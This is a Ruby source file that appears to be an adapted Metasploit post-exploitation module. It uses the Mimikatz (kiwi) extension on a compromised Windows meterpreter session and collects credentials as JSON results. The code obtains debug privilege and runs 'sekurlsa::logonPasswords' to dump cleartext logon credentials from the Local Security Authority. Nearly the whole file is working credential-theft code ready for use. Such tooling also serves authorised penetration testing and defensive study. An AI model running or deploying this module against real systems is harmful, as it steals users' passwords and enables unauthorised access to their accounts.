##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'yajl'
require 'msf/core/post/windows/priv'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
                      'Description'  => %q{
        This module will collect cleartext Single Sign On credentials from the Local
      Security Authority using the Mimikatz extension. Blank passwords will not be stored
      in the database.
          },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['Ben Campbell'],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))
    register_advanced_options(
            [

            ])
  end

  def run

    if session.type == "shell"
      pub_json_result(false,
                      "Unsupport shell type",
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"

      pub_json_result(false,
                      'linux did not have Mimikatz extensions',
                      nil,
                      self.uuid)
      return
    end

    if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64

      pub_json_result(false,
                      'x64 platform requires x64 meterpreter and mimikatz extension',
                      nil,
                      self.uuid)
      return
    end

    unless client.kiwi
      vprint_status("Loading kiwi extension...")
      begin
        client.core.use("kiwi")
      rescue Errno::ENOENT
        pub_json_result(false,
                        'load kiwi failed',
                        nil,
                        self.uuid)
        return
      end
    end

    unless is_system?
      vprint_warning("Not running as SYSTEM")
      debug = client.kiwi.exec_cmd("privilege::debug")
      if debug =~ /Not all privileges or groups referenced are assigned to the caller/
        pub_json_result(false,
                        'Unable to get Debug privilege.',
                        nil,
                        self.uuid)
        return
      else
        vprint_status("Retrieved Debug privilege")
      end
    end

    data = client.kiwi.exec_cmd("sekurlsa::logonPasswords")

    pub_json_result(true,
                    nil,
                    data,
                    self.uuid)

  end


end

